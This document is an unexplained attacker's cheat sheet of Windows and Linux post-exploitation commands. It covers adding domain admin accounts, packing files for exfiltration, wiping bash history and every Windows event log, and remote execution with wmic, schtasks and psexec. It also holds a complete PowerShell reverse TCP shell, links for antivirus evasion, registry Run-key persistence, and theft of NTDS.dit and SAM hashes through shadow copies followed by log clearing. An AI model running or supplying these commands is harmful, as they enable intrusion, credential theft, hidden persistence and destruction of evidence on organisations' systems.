# Scan
```command
```



# Domain control
```command
net user
net user /domain
net group /domain
net view /domain
net group "domain admins" /domain
net localgroup administrators /domain
net user username password /add /domain
net time /domain
net view /domain
net localgroup administrators workgroup\test123 /add
net group "domain controllers" /domain

dsquery computer
dsquery contact
dsquery group
dsquery user
dsquery subnet
dsquery server
```

# Information package
```command
7z.exe -r -v6m -padmin a c:\test.7z C:\AppServ\www\import*.*
7z.exe x -padmin test.7z.001 -oc:\xl

Rar.exe a -r -v6m -padmin -m3 -x*.txt -ta c:\test.rar C:\AppServ\www\import*.*
Rar.exe x -padmin c:\test.part01.rar c:\xl

makecab /d compressiontype=lzx C:\Users\lsass.txt C:\Users\lsass.cab >> C:\Users\info.txt
expand.exe lsass.cab -f:* .
```

# Log clear
```command
Linux
wc -l ~/.bash_history
sed -i '73,$d' ~/.bash_history
tail -10f ~/.bash_history

Windows
///CMD:Enable or disable a log
for /f "delims=" %a in ('WEVTUTIL EL') do WEVTUTIL SL "%a" /e:false

///bat
WEVTUTIL EL > .\LOGLIST.TXT
for /f "delims=" %%a in ( .\LOGLIST.TXT ) do WEVTUTIL CL "%%a"
del .\LOGLIST.TXT

powershell.exe -command "wevtutil el | Foreach-Object {wevtutil cl "$_"}"
powershell.exe -command "Get-WinEvent -ListLog * -Force | % {Wevtutil.exe cl $_.logname}"
```

# Remote execute
```command
wmic /node:192.168.1.1 /user:administrator /password:"passwd" /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
wmic /node:192.168.1.1 /user:administrator /password:"passwd" os get Caption,OSArchitecture,Version
wmic /node:192.168.1.1 /user:administrator /password:"passwd" product list brief |more
wmic /node:192.168.1.1 /user:administrator /password:"passwd" process list brief |more
wmic /node:192.168.1.1 /user:administrator /password:"passwd" startup list brief |more
wmic /node:192.168.1.1 /user:administrator /password:"passwd" process where name="test.exe" call terminate

schtasks /create /s 172.10.1.1 /u administrator /p "passwd" /ru SYSTEM /tn test /sc DAILY /tr "C:\Users\hacker.exe -a -b c" /F & schtasks /run /s 172.10.1.1 /u administrator /p "passwd" /tn test /i & schtasks /delete /s 172.10.1.1 /u administrator /p "passwd" /tn test /f
python psexec.py test:passwdtest@10.10.1.1 cmd
python wmiexec.py test:passwdtest@10.10.1.1
Psexec.exe \\10.10.1.1 -u test -p passwdtest cmd
```

# Powershell
```command
copy file for time
powershell.exe -command "Get-ChildItem -Path C:\ -Recurse –Include .txt,.doc,.xls,.pdf,.ppt,.docx,.xlsx,.pptf,.csv,.lnk | Where-Object { $.LastWriteTime -ge '02/01/2019 00:00:00' -AND $.LastWriteTime -le '10/27/2022 00:00:00'} | Copy-Item -Force -Destination C:\Users"

write file
powershell.exe -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("......")) | Set-Content testfoo.txt"

reverse tcp shell
nc -lvp 6666
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.10.139',6666);$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# BypassAV

<https://github.com/TideSec/BypassAntiVirus>

<https://github.com/clinicallyinane/shellcode_launcher>

<https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html>

# Persistence
```command
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v test /t REG_SZ /d "rundll32.exe "C:\Users\test\test.dll" Test"
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "test" /f
```

# Domain hash
```command
wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" path win32_shadowcopy get id,InstallDate
wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" path win32_shadowcopy where id="{ghgfhfgtyy7-BDD6-888-978E-ghj78686786}"
wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ 2>&1"
wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\ 2>&1"
wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\sam C:\temp\ 2>&1"
wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "wevtutil cl Microsoft-Windows-SMBServer/Operational"
wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "wevtutil cl Microsoft-Windows-SMBClient/Connectivity"
```

# Hash crack
```command
python /root/Desktop/impacket-master/examples/secretsdump.py -ntds '/root/Desktop/ntds.dit' -system '/root/Desktop/SYSTEM' LOCAL >/root/Desktop/hash.txt &
grep -E "4768" *.log |awk 'BEGIN{FS="Account Name:"} {print $2}'|awk 'BEGIN{FS="ffff:"} {print $1,$2}'|awk 'BEGIN{FS=" "} {printf $1 "\t" $22 "\n"}'>Decod.txt
grep -E "4624" *.log|awk 'BEGIN{FS="Source Port:"} {print $1}'|awk 'BEGIN{FS="Account Name:"} {print $3 $4}'|awk 'BEGIN{FS=" "} {printf $1 "\t" $NF "\n"}' >>Decod.txt
cat Decod.txt |sort| uniq -c | sort -nr > Decodhash.txt
```
